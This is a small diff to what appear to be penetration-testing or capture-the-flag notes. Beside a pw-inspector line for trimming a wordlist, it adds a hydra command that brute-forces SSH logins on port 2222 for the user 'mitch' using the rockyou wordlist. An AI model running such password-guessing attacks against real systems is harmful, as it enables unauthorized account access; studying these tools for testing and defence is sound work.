@@ -8,3 +8,5 @@
 ## pw-inspector(to trim)
 ### min and max 
 - cat password.txt | pw-inspector -m 6 -M 9 
+## SSH
+hydra -s 2222 -v -q -l mitch -P /usr/share/wordlists/rockyou.txt -e nsr -t 4 -w 5 IP ssh
